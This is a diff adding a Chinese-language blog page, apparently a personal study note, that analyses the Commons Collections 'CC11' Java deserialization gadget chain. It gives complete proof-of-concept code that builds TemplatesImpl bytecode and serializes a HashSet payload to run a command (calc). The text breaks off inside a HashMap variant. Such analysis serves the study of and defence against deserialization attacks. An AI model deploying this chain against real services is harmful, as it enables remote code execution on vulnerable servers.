@@ -1,0 +1,625 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="Okaytc" />
+  <meta name="description" content="生活 健身 学习 沉淀" />
+  
+  
+  <title>
+    
+      java安全-CC11链学习与分析 
+      
+      
+      |
+    
+     Okaytc
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/head-3.jpg">
+    <link rel="icon" href="/images/head-3.jpg">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/head-3.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Okaytc</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">文章</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">友链</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">关于</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">java安全-CC11链学习与分析</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2023-03-14 12:51:00
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/Java%E5%AE%89%E5%85%A8/" title="Java安全">
+                    #Java安全
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/java%E5%88%A9%E7%94%A8%E9%93%BE/" title="java利用链">
+                    #java利用链
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>CC1-7分析完，接着看到cc11使用比较广泛（优势：使用到字节码加载且cc组件版本在3.1-3.2.1），接着分析下CC11（CC2+CC6的组合变式）</p>
+<h1 id="0x01、分析"><a href="#0x01、分析" class="headerlink" title="0x01、分析"></a>0x01、分析</h1><h2 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h2><p>CC2（TemplatesImpl）：</p>
+<ul>
+<li>通过反射调用<code>InvokerTransformer</code>构造方法传递方法名<code>getOutputProperties/newTransformer</code>。</li>
+<li>通过<code>javassist</code>生成恶意代码的字节码。</li>
+<li>通过<code>TemplatesImpl</code>将字节码转化成类。</li>
+<li>将反射<code>InvokerTransformer</code>对象作为比较器传递入<code>PriorityQueue</code>优先级队列。</li>
+<li>将<code>TemplatesImpl</code>对象元素添加入<code>PriorityQueue</code>队列。</li>
+<li>在比较器进行元素比较时触发<code>TemplatesImpl</code>的<code>getOutputProperties/newTransformer</code>方法，触发漏洞。</li>
+</ul>
+<hr>
+<p>CC6：</p>
+<ul>
+<li>生成<code>LazyMap</code>对象，将<code>InvokerTransformer</code>利用方法串起来的<code>ChainedTransformer</code>对象传入<code>LazyMap</code>构造方法。</li>
+<li>将<code>LazyMap</code>对象传入<code>TiedMapEntry</code>类构造方法，再通过<code>TiedMapEntry.hashCode()</code>方法去调用<code>TiedMapEntry.getValue()</code>方法，最后调用到<code>lazyMap.get()</code>方法。</li>
+<li>通过使用<code>hashmap</code>的<code>put</code>方法添加元素时调用<code>hash(key)</code>方法，进而调用<code>key.hashCode()</code>方法，将<code>TiedMapEntry</code>对象作为key<code>put</code>入<code>hashmap</code>中，达到调用<code>TiedMapEntry.hashCode()</code>的目的（hashSet同理,本质上都是调用hashmap）。</li>
+</ul>
+<p>cc2和cc6的分析：（就不把相同部分贴进来了分析思路即可）<br><a href="https://okaytc.github.io/posts/7e30cd4a.html">cc2</a><br><a href="https://okaytc.github.io/posts/9758c0a8.html">cc6</a></p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>cc11使用cc2的字节码再加上cc6的hashset(hashmap同理)进行组合变式，通过hashset的添加值去触发字节码加载达到漏洞效果。</p>
+<p><code>TemplatesImpl</code>字节码加载部分见cc2分析中写的即可，主要目的是调用<code>newTransformer/getOutputProperties</code>方法来对字节码加载进行实例化，从而触发漏洞。</p>
+<h3 id="cc6利用原理"><a href="#cc6利用原理" class="headerlink" title="cc6利用原理"></a>cc6利用原理</h3><p>接着先理一下cc6中后半段得利用</p>
+<p><code>Lazymap</code>调用<code>decorate</code>方法对<code>Lazymap</code>进行实例化对象，同时传递参数<code>Transformer factory</code></p>
+<p><img src="/posts/7e9687c7/cc11-1.png" title="lazymap"></p>
+<p>调用构造方法对factory变量进行赋值</p>
+<p><img src="/posts/7e9687c7/cc11-2.png" title="factory赋值"></p>
+<p>然后通过调用<code>lazymap</code>的<code>get</code>方法调用<code>factory.transform(key)</code>方法</p>
+<p><img src="/posts/7e9687c7/cc11-3.png" title="get"></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="comment">//获取Runtime类对象</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure>
+
+<p>然后将上面的<code>transformerChain</code>变量传递实例化<code>Lazymap</code>的<code>factory</code>，达到调用<code>transformers.transform()</code>，触发漏洞。</p>
+<p>然后就是找到在哪调用的<code>LazyMap.get</code>方法，cc6中就是通过<code>TiedMapEntry.getValue()</code>去调用<code>get</code>方法</p>
+<p><img src="/posts/7e9687c7/cc11-4.png" title="TiedMapEntry"></p>
+<p>接着上一步<code>hashCode</code>方法调用<code>getValue()</code></p>
+<p><img src="/posts/7e9687c7/cc11-5.png" title="hashCode"></p>
+<p>然后通过<code>hashset</code>调用<code>hashCode</code>，调用情况如下，将<code>TiedMapEntry</code>作为<code>key</code>，调用<code>hashset.add(key)</code>即可调用<code>key.hashCode()</code>即<code>TiedMapEntry.hashCode()</code>触发漏洞</p>
+<p><img src="/posts/7e9687c7/cc11-6.png" title="hashCode"><br><img src="/posts/7e9687c7/cc11-7.png" title="put"><br><img src="/posts/7e9687c7/cc11-8.png" title="hashcode"></p>
+<h3 id="cc11分析"><a href="#cc11分析" class="headerlink" title="cc11分析"></a>cc11分析</h3><p>漏洞原理知道了，现在就看cc11中<code>hashset</code>如何调用到<code>TemplatesImpl</code>字节码的<code>newTransformer/getOutputProperties</code>方法</p>
+<p>主要变动在链转换器的调用</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过反射调用InvokerTransformer的带参构造方法，参数为执行的方法名，因此传递类型为String.class</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">cons</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections.functors.InvokerTransformer&quot;</span>).getDeclaredConstructor(String.class);</span><br><span class="line"><span class="comment">//突破限制，强制调用</span></span><br><span class="line">cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//生成InvokerTransformer对象,引用构造函数，参数为getOutputProperties方法名，也可以为newTransformer方法名</span></span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> (InvokerTransformer) cons.newInstance(<span class="string">&quot;newTransformer&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>cc11通过反射调用<code>invokerTransformer</code>对象构造参数，并将<code>newTransformer</code>方法名传入</p>
+<p><img src="/posts/7e9687c7/cc11-9.png" title="invokerTransformer"></p>
+<p>然后调用LazyMap调用<code>decorate</code>方法对<code>Lazymap</code>进行实例化对象，同时传递参数<code>Transformer factory</code>（参数即为<code>invokerTransformer</code>对象），目的调用<code>invokerTransformer.transform()</code></p>
+<p><img src="/posts/7e9687c7/cc11-10.png" title="get"></p>
+<p>只需要传递的key为<code>TemplatesImpl</code>对象，就能调用<code>invokerTransformer.transform(TemplatesImpl)</code>，即反射调用<code>TemplatesImpl.newTransformer</code>方法，触发漏洞。</p>
+<p>通过<code>TiedMapEntry</code>调用get方法，其中key参数即为<code>TemplatesImpl</code>对象目的调用<code>get(TemplatesImpl)</code>，其中的<code>map</code>参数即为<code>Lazymap</code>对象，目的调用<code>Lazymap.get()</code>方法</p>
+<p><img src="/posts/7e9687c7/cc11-11.png" title="get"></p>
+<p>因此构造的代码为,后面通过<code>hashset.add</code>进行触发，为了规避本地触发问题，通过反射修改<code>hashset</code>表的<code>key</code>值在cc6中分析提及过。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="comment">//通过反射调用InvokerTransformer的带参构造方法，参数为执行的方法名，因此传递类型为String.class</span></span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">cons</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections.functors.InvokerTransformer&quot;</span>).getDeclaredConstructor(String.class);</span><br><span class="line">    <span class="comment">//突破限制，强制调用</span></span><br><span class="line">    cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="comment">//生成InvokerTransformer对象,引用构造函数，参数为getOutputProperties方法名，也可以为newTransformer方法名</span></span><br><span class="line">    <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> (InvokerTransformer) cons.newInstance(<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//效果同上，方式不同，一种通过反射调用单参数的构造方法，另一种通过反射修改参数值，因为InvokerTransformer类的单参数构造方法无法直接实例化</span></span><br><span class="line">    <span class="comment">//InvokerTransformer transformer = new InvokerTransformer(&quot;any&quot;, new Class[0], new Object[0]);</span></span><br><span class="line">    <span class="comment">//反射修改iMethodName值为调用TemplatesImpl的newTransformer来执行恶意字节码</span></span><br><span class="line">    <span class="comment">//setFieldValue(transformer,&quot;iMethodName&quot;,&quot;newTransformer&quot;);</span></span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">    Map Lmap= LazyMap.decorate(map,invokerTransformer);</span><br><span class="line">    TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,templates);</span><br><span class="line">    HashSet hs=<span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">    hs.add(<span class="string">&quot;any&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取hashset中的hashmap对象属性</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">hsset</span> <span class="operator">=</span> HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">    hsset.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    HashMap hsmap=(HashMap) hsset.get(hs);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//通过反射获取HashMap表中的table字段属性</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">    table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    Object[] tablearray = (Object[])table.get(hsmap);</span><br><span class="line">    <span class="comment">//对node进行初始化</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> tablearray[<span class="number">0</span>];</span><br><span class="line">    <span class="comment">//获取table表中目标元素，也就是要修改的元素,由于序号不同（比如我这是13），写了个直接遍历序号不为null的表示存在Key</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;tablearray.length;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(tablearray[i]==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        node = tablearray[i];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//修改元素的key值为TiedMapEntry</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">key</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">    key.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    key.set(node,TM);</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过反射给对象属性赋值，避免代码冗余繁琐</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    field.set(obj, value);</span><br></pre></td></tr></table></figure>
+
+<p>将<code>TemplatesImpl</code>字节码部分和反序列化部分加上就得到完整的poc：</p>
+<h3 id="cc11-poc-hashset"><a href="#cc11-poc-hashset" class="headerlink" title="cc11-poc(hashset)"></a>cc11-poc(hashset)</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC11Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//创建CtClass对象容器</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool2</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//pool2.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span></span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ct</span> <span class="operator">=</span> pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line">        <span class="comment">//设置People2类的父类为AbstractTranslet，满足实例化条件</span></span><br><span class="line">        ct.setSuperclass(pool2.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">//创建构造函数</span></span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">cons2</span> <span class="operator">=</span> ct.makeClassInitializer();</span><br><span class="line">        <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">        cons2.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="comment">//javassist转换字节码并转化为二位数组</span></span><br><span class="line">        <span class="type">byte</span>[] bytecode = ct.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br><span class="line">        <span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredConstructor().newInstance();</span><br><span class="line">        <span class="comment">//设置满足条件属性_bytecodes为恶意构造字节码</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytecodes);</span><br><span class="line">        <span class="comment">//设置满足条件属性_class为空</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_name不为空，任意赋值都行</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_tfactory实例化</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.getDeclaredConstructor().newInstance());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射调用InvokerTransformer的带参构造方法，参数为执行的方法名，因此传递类型为String.class</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">cons</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections.functors.InvokerTransformer&quot;</span>).getDeclaredConstructor(String.class);</span><br><span class="line">        <span class="comment">//突破限制，强制调用</span></span><br><span class="line">        cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//生成InvokerTransformer对象,引用构造函数，参数为getOutputProperties方法名，也可以为newTransformer方法名</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> (InvokerTransformer) cons.newInstance(<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//效果同上，方式不同，一种通过反射调用单参数的构造方法，另一种通过反射修改参数值，因为InvokerTransformer类的单参数构造方法无法直接实例化</span></span><br><span class="line">        <span class="comment">//InvokerTransformer transformer = new InvokerTransformer(&quot;any&quot;, new Class[0], new Object[0]);</span></span><br><span class="line">        <span class="comment">//反射修改iMethodName值为调用TemplatesImpl的newTransformer来执行恶意字节码</span></span><br><span class="line">        <span class="comment">//setFieldValue(transformer,&quot;iMethodName&quot;,&quot;newTransformer&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">        Map Lmap= LazyMap.decorate(map,invokerTransformer);</span><br><span class="line">        TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,templates);</span><br><span class="line">        HashSet hs=<span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">        hs.add(<span class="string">&quot;any&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取hashset中的hashmap对象属性</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">hsset</span> <span class="operator">=</span> HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        hsset.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        HashMap hsmap=(HashMap) hsset.get(hs);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射获取HashMap表中的table字段属性</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] tablearray = (Object[])table.get(hsmap);</span><br><span class="line">        <span class="comment">//对node进行初始化</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> tablearray[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">//获取table表中目标元素，也就是要修改的元素,由于序号不同（比如我这是13），写了个直接遍历序号不为null的表示存在Key</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;tablearray.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(tablearray[i]==<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            node = tablearray[i];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//修改元素的key值为TiedMapEntry</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">key</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        key.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        key.set(node,TM);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc11payload.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(hs);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc11payload.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//通过反射给对象属性赋值，避免代码冗余繁琐</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>执行效果：</p>
+<p><img src="/posts/7e9687c7/cc11-12.png" title="执行效果"></p>
+<h3 id="cc11-poc-hashmap"><a href="#cc11-poc-hashmap" class="headerlink" title="cc11-poc(hashmap)"></a>cc11-poc(hashmap)</h3><p>同理，hashmap同样能作为反序列化入口（hashset相当于套用了hashmap，可以理解为固定value值的hashmap）</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC11Test2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//创建CtClass对象容器</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool2</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//pool2.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span></span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ct</span> <span class="operator">=</span> pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line">        <span class="comment">//设置People2类的父类为AbstractTranslet，满足实例化条件</span></span><br><span class="line">        ct.setSuperclass(pool2.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">//创建构造函数</span></span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">cons2</span> <span class="operator">=</span> ct.makeClassInitializer();</span><br><span class="line">        <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">        cons2.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="comment">//javassist转换字节码并转化为二位数组</span></span><br><span class="line">        <span class="type">byte</span>[] bytecode = ct.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br><span class="line">        <span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredConstructor().newInstance();</span><br><span class="line">        <span class="comment">//设置满足条件属性_bytecodes为恶意构造字节码</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytecodes);</span><br><span class="line">        <span class="comment">//设置满足条件属性_class为空</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_name不为空，任意赋值都行</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_tfactory实例化</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.getDeclaredConstructor().newInstance());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射调用InvokerTransformer的带参构造方法，参数为执行的方法名，因此传递类型为String.class</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">cons</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections.functors.InvokerTransformer&quot;</span>).getDeclaredConstructor(String.class);</span><br><span class="line">        <span class="comment">//突破限制，强制调用</span></span><br><span class="line">        cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//生成InvokerTransformer对象,引用构造函数，参数为getOutputProperties方法名，也可以为newTransformer方法名</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> (InvokerTransformer) cons.newInstance(<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//效果同上，方式不同，一种通过反射调用单参数的构造方法，另一种通过反射修改参数值，因为InvokerTransformer类的单参数构造方法无法直接实例化</span></span><br><span class="line">        <span class="comment">//InvokerTransformer transformer = new InvokerTransformer(&quot;any&quot;, new Class[0], new Object[0]);</span></span><br><span class="line">        <span class="comment">//反射修改iMethodName值为调用TemplatesImpl的newTransformer来执行恶意字节码</span></span><br><span class="line">        <span 